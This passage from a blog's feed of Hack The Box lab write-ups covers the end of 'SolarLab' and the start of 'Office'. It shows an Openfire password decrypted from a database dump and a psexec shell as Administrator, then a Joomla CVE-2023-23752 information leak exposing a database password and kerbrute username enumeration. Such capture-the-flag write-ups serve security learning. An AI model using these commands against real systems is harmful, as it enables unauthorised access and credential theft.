</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,1,&#39;001700223778861&#39;,127,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Openfire 4.7.5&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,2,&#39;001700223779069&#39;,125,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Search 1.7.4&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,6,&#39;001714131992714&#39;,127,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Openfire 4.8.1&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,7,&#39;001714131993136&#39;,125,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Search 1.7.4&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,11,&#39;001715023572659&#39;,127,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Openfire 4.8.1&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,12,&#39;001715023572956&#39;,125,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Search 1.7.4&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(18,1)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(19,16)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(23,1)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(25,3)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(26,2)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(27,1)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;cache.MUCService&#39;&#39;conference&#39;&#39;RoomStatistics.maxLifetime&#39;,&#39;-1&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;cache.MUCService&#39;&#39;conference&#39;&#39;RoomStatistics.size&#39;,&#39;-1&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;cache.MUCService&#39;&#39;conference&#39;&#39;Rooms.maxLifetime&#39;,&#39;-1&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;cache.MUCService&#39;&#39;conference&#39;&#39;Rooms.size&#39;,&#39;-1&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;passwordKey&#39;,&#39;hGXiFzsKaAeYLjn&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.admin.className&#39;,&#39;org.jivesoftware.openfire.admin.DefaultAdminProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.auth.className&#39;,&#39;org.jivesoftware.openfire.auth.DefaultAuthProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.group.className&#39;,&#39;org.jivesoftware.openfire.group.DefaultGroupProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.lockout.className&#39;,&#39;org.jivesoftware.openfire.lockout.DefaultLockOutProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.securityAudit.className&#39;,&#39;org.jivesoftware.openfire.security.DefaultSecurityAuditProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.user.className&#39;,&#39;org.jivesoftware.openfire.user.DefaultUserProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.vcard.className&#39;,&#39;org.jivesoftware.openfire.vcard.DefaultVCardProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;update.lastCheck&#39;,&#39;1715023572956&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;xmpp.auth.anonymous&#39;,&#39;false&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;xmpp.domain&#39;,&#39;solarlab.htb&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;xmpp.proxy.enabled&#39;,&#39;false&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;xmpp.socket.ssl.active&#39;,&#39;true&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFVERSION VALUES(&#39;openfire&#39;,34)
</span></span><span style="display:flex;"><span>INSERT INTO OFSECURITYAUDITLOG VALUES(1,&#39;admin&#39;,1700223751042,&#39;Successful admin console login attempt&#39;,&#39;solarlab.htb&#39;,&#39;The user logged in successfully to the admin console from address 127.0.0.1. &#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFSECURITYAUDITLOG VALUES(2,&#39;admin&#39;,1700223756534,&#39;edited file transfer proxy settings&#39;,&#39;solarlab.htb&#39;,&#39;port = 7777\u000ahardcodedAddress = null\u000aenabled = false&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFMUCSERVICE VALUES(1,&#39;conference&#39;,NULL,0)
</span></span><span style="display:flex;"><span>INSERT INTO OFPUBSUBNODE VALUES(&#39;pubsub&#39;,&#39;&#39;,0,&#39;001700223743445&#39;,&#39;001700223743445&#39;,NULL,0,0,0,0,1,1,1,0,0,&#39;publishers&#39;,1,0,&#39;open&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;solarlab.htb&#39;,&#39;&#39;,&#39;English&#39;,&#39;&#39;,NULL,&#39;all&#39;,-1)
</span></span><span style="display:flex;"><span>INSERT INTO OFPUBSUBAFFILIATION VALUES(&#39;pubsub&#39;,&#39;&#39;,&#39;solarlab.htb&#39;,&#39;owner&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFPUBSUBDEFAULTCONF VALUES(&#39;pubsub&#39;,0,0,0,0,0,1,1,1,0,0,&#39;publishers&#39;,1,&#39;open&#39;,&#39;English&#39;,NULL,&#39;all&#39;,-1)
</span></span><span style="display:flex;"><span>INSERT INTO OFPUBSUBDEFAULTCONF VALUES(&#39;pubsub&#39;,1,1,10485760,0,1,1,1,1,0,1,&#39;publishers&#39;,1,&#39;open&#39;,&#39;English&#39;,NULL,&#39;all&#39;,-1)
</span></span></code></pre></div><p>The important parts are:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>INSERT INTO OFUSER VALUES(&#39;admin&#39;,&#39;gjMoswpK+HakPdvLIvp6eLKlYh0=&#39;,&#39;9MwNQcJ9bF4YeyZDdns5gvXp620=&#39;,&#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#39;,4096,NULL,&#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#39;,&#39;Administrator&#39;,&#39;admin@solarlab.htb&#39;,&#39;001700223740785&#39;,&#39;0&#39;)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;passwordKey&#39;,&#39;hGXiFzsKaAeYLjn&#39;,0,NULL)
</span></span></code></pre></div><p>After a lot of struggle found a <a href="https://github.com/c0rdis/openfire_decrypt">Github Repo</a> that can decrypt the password hash if we have the <code>passwordKey</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn             
</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span><span style="display:flex;"><span>*************** (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)
</span></span></code></pre></div><p><strong>Administrator Credential</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Administrator:**************
</span></span></code></pre></div><p>Using psexec by Impacket I was able get a shell as Administrator. ** psexec needs a writable share to upload a malicious binary to create a service using the Service Manager. It then uses this binary for the service&rsquo;s binPath and start the server. So, to get a shell using psexec we need following conditions:</p>
<ul>
<li>A writeable share to upload a malicious Binary</li>
<li>Proper privilege token assigned to add, start, stop and remove a service.</li>
</ul>
</li>
</ul>
<h2 id="summary">Summary</h2>
<p>I struggled to find a foothold on the box because I didn&rsquo;t test all the parameters to send the exploit. Also, after gaining openfire user&rsquo;s shell I also found it difficult to recover the Administrator password because I lacked the knowledge of openfire password decryption tool.
Overall, my recon was good.</p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>HTB Machine Office</title>
      <link>https://hshakilst.github.io/posts/htb-machines/office/</link>
      <pubDate>Thu, 16 May 2024 17:00:43 +0200</pubDate>
      
      <guid>https://hshakilst.github.io/posts/htb-machines/office/</guid>
      <description><![CDATA[<h1 id="office---htbhttpsapphacktheboxcommachinesoffice">Office - <a href="https://app.hackthebox.com/machines/Office">HTB</a></h1>
<p><img src="images/image.png" alt="alt text"></p>
<h2 id="recon">Recon</h2>
<h3 id="nmap">Nmap</h3>
<table>
<thead>
<tr>
<th>Port</th>
<th>State</th>
<th>Service</th>
<th>Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>53/tcp</td>
<td>open</td>
<td>domain</td>
<td>Simple DNS Plus</td>
</tr>
<tr>
<td>80/tcp</td>
<td>open</td>
<td>http</td>
<td>httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)</td>
</tr>
<tr>
<td>88/tcp</td>
<td>open</td>
<td>kerberos-sec</td>
<td>Microsoft Windows Kerberos</td>
</tr>
<tr>
<td>139/tcp</td>
<td>open</td>
<td>netbios-ssn</td>
<td>Microsoft Windows netbios-ssn</td>
</tr>
<tr>
<td>389/tcp</td>
<td>open</td>
<td>ldap</td>
<td>Microsoft Windows Active Directory LDAP</td>
</tr>
<tr>
<td>443/tcp</td>
<td>open</td>
<td>ssl/http</td>
<td>Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)</td>
</tr>
<tr>
<td>445/tcp</td>
<td>open</td>
<td>microsoft-ds?</td>
<td></td>
</tr>
<tr>
<td>464/tcp</td>
<td>open</td>
<td>kpasswd5?</td>
<td></td>
</tr>
<tr>
<td>593/tcp</td>
<td>open</td>
<td>ncacn_http</td>
<td>Microsoft Windows RPC over HTTP 1.0</td>
</tr>
<tr>
<td>636/tcp</td>
<td>open</td>
<td>ssl/ldap</td>
<td>Microsoft Windows Active Directory LDAP</td>
</tr>
<tr>
<td>3268/tcp</td>
<td>open</td>
<td>ldap</td>
<td>Microsoft Windows Active Directory LDAP</td>
</tr>
<tr>
<td>3269/tcp</td>
<td>open</td>
<td>ssl/ldap</td>
<td>Microsoft Windows Active Directory LDAP</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>Host Script Results:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:1:1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
</span></span><span style="display:flex;"><span>| p2p-conficker: 
</span></span><span style="display:flex;"><span>|   Checking for Conficker.C or higher...
</span></span><span style="display:flex;"><span>|   Check 1 (port 15731/tcp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 2 (port 48612/tcp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 3 (port 52719/udp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 4 (port 54522/udp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span><span style="display:flex;"><span>|_clock-skew: 7h55m29s
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2024-04-28T22:53:10
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span></code></pre></div><p>I think it will be better if we fix our clock-skew that is almost 8 hours. To do that let&rsquo;s run the following command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo ntpdate -u 10.10.11.3
</span></span></code></pre></div></li>
</ul>
<h2 id="enumeration">Enumeration</h2>
<h3 id="http-enumeration">HTTP Enumeration</h3>
<ul>
<li>
<p><strong>Joomla CMS 4.2 - CVE-2023-23752</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ curl http://office.htb/README.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Joomla! CMS™
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>1- Overview
</span></span><span style="display:flex;"><span>	* This is a Joomla! 4.x installation/upgrade package.
</span></span><span style="display:flex;"><span>	* Joomla! Official site: https://www.joomla.org
</span></span><span style="display:flex;"><span>	* Joomla! 4.2 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_4.2_version_history
</span></span><span style="display:flex;"><span>	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev
</span></span></code></pre></div><p>This version is vulnerable to Unauthenticated information disclosure (CVE-2023-23752) due to Improper access check. So we can access some restricted endpoints.</p>
<p><strong>Users</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ curl http://office.htb/api/index.php/v1/users?public=true
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{&#34;links&#34;:{&#34;self&#34;:&#34;http:\/\/office.htb\/api\/index.php\/v1\/users?public=true&#34;},&#34;data&#34;:[{&#34;type&#34;:&#34;users&#34;,&#34;id&#34;:&#34;474&#34;,&#34;attributes&#34;:{&#34;id&#34;:474,&#34;name&#34;:&#34;Tony Stark&#34;,&#34;username&#34;:&#34;Administrator&#34;,&#34;email&#34;:&#34;Administrator@holography.htb&#34;,&#34;block&#34;:0,&#34;sendEmail&#34;:1,&#34;registerDate&#34;:&#34;2023-04-13 23:27:32&#34;,&#34;lastvisitDate&#34;:&#34;2024-04-26 19:43:46&#34;,&#34;lastResetTime&#34;:null,&#34;resetCount&#34;:0,&#34;group_count&#34;:1,&#34;group_names&#34;:&#34;Super Users&#34;}}],&#34;meta&#34;:{&#34;total-pages&#34;:1}}
</span></span></code></pre></div><p><strong>Application Config</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ff79c6">$</span> curl http:<span style="color:#ff79c6">//</span>office<span style="color:#ff79c6">.</span>htb<span style="color:#ff79c6">/</span>api<span style="color:#ff79c6">/</span>index<span style="color:#ff79c6">.</span>php<span style="color:#ff79c6">/</span>v1<span style="color:#ff79c6">/</span>config<span style="color:#ff79c6">/</span>application?public<span style="color:#ff79c6">=</span>true
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{<span style="color:#f1fa8c">&#34;links&#34;</span>:{<span style="color:#f1fa8c">&#34;self&#34;</span>:<span style="color:#f1fa8c">&#34;http:\/\/office.htb\/api\/index.php\/v1\/config\/application?public=true&#34;</span>,<span style="color:#f1fa8c">&#34;next&#34;</span>:<span style="color:#f1fa8c">&#34;http:\/\/office.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=20&amp;page%5Blimit%5D=20&#34;</span>,<span style="color:#f1fa8c">&#34;last&#34;</span>:<span style="color:#f1fa8c">&#34;http:\/\/office.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=60&amp;page%5Blimit%5D=20&#34;</span>},<span style="color:#f1fa8c">&#34;data&#34;</span>:[{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;offline&#34;</span>:false,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;offline_message&#34;</span>:<span style="color:#f1fa8c">&#34;This site is down for maintenance.&lt;br&gt;Please check back again soon.&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;display_offline_message&#34;</span>:<span style="color:#bd93f9">1</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;offline_image&#34;</span>:<span style="color:#f1fa8c">&#34;&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;sitename&#34;</span>:<span style="color:#f1fa8c">&#34;Holography Industries&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;editor&#34;</span>:<span style="color:#f1fa8c">&#34;tinymce&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;captcha&#34;</span>:<span style="color:#f1fa8c">&#34;0&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;list_limit&#34;</span>:<span style="color:#bd93f9">20</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;access&#34;</span>:<span style="color:#bd93f9">1</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;debug&#34;</span>:false,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;debug_lang&#34;</span>:false,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;debug_lang_const&#34;</span>:true,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;dbtype&#34;</span>:<span style="color:#f1fa8c">&#34;mysqli&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;host&#34;</span>:<span style="color:#f1fa8c">&#34;localhost&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;user&#34;</span>:<span style="color:#f1fa8c">&#34;root&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;password&#34;</span>:<span style="color:#f1fa8c">&#34;H0lOgrams4reTakIng0Ver754!&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;db&#34;</span>:<span style="color:#f1fa8c">&#34;joomla_db&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;dbprefix&#34;</span>:<span style="color:#f1fa8c">&#34;if2tx_&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;dbencryption&#34;</span>:<span style="color:#bd93f9">0</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;dbsslverifyservercert&#34;</span>:false,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}}],<span style="color:#f1fa8c">&#34;meta&#34;</span>:{<span style="color:#f1fa8c">&#34;total-pages&#34;</span>:<span style="color:#bd93f9">4</span>}}
</span></span></code></pre></div><p><strong>Credentials</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>root:H0lOgrams4reTakIng0Ver754!
</span></span></code></pre></div><p>At a first glance it looks like a credential for the database of the Joomla Service. I tried to login using the cred to Joomla Admin panel no luck there.</p>
</li>
</ul>
<h3 id="ad-enumeration">AD Enumeration</h3>
<p>Using the above credential I tried to login using SMB, LDAP no luck there too. Because I only possesed one username <code>Administrator</code>, having only this will not help. I had a password so I can try password spraying attack on the AD but I needed some valid usernames.</p>
<p>Because <code>kerberos</code> is enabled on the machine it can help us to gather usernames. Because by default I think kerberos authentication on AD returns a unique error for usernames that don&rsquo;t exist.</p>
<ul>
<li>
<p><strong>User Enumeration (kerberos)</strong></p>
<p>Using <a href="https://github.com/ropnop/kerbrute">kerbrute by ropnop</a> I tested a list of users against kerberos and tried to find some valid usernames.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ff79c6">$</span> kerbrute userenum <span style="color:#ff79c6">--</span>dc dc<span style="color:#ff79c6">.</span>office<span style="color:#ff79c6">.</span>htb <span style="color:#ff79c6">-</span>d office<span style="color:#ff79c6">.</span>htb <span style="color:#ff79c6">~/</span>SecLists<span style="color:#ff79c6">/</span>Usernames<span style="color:#ff79c6">/</span>xato<span style="color:#ff79c6">-</span>net<span style="color:#ff79c6">-</span><span style="color:#bd93f9">10</span><span style="color:#ff79c6">-</span>million<span style="color:#ff79c6">-</span>usernames<span style="color:#ff79c6">.</span>txt <span style="color:#ff79c6">-</span>o kerbrute<span style="color:#ff79c6">.</span>log
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __             __               __     
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>_____  _____<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>_  _______  __<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>____ 
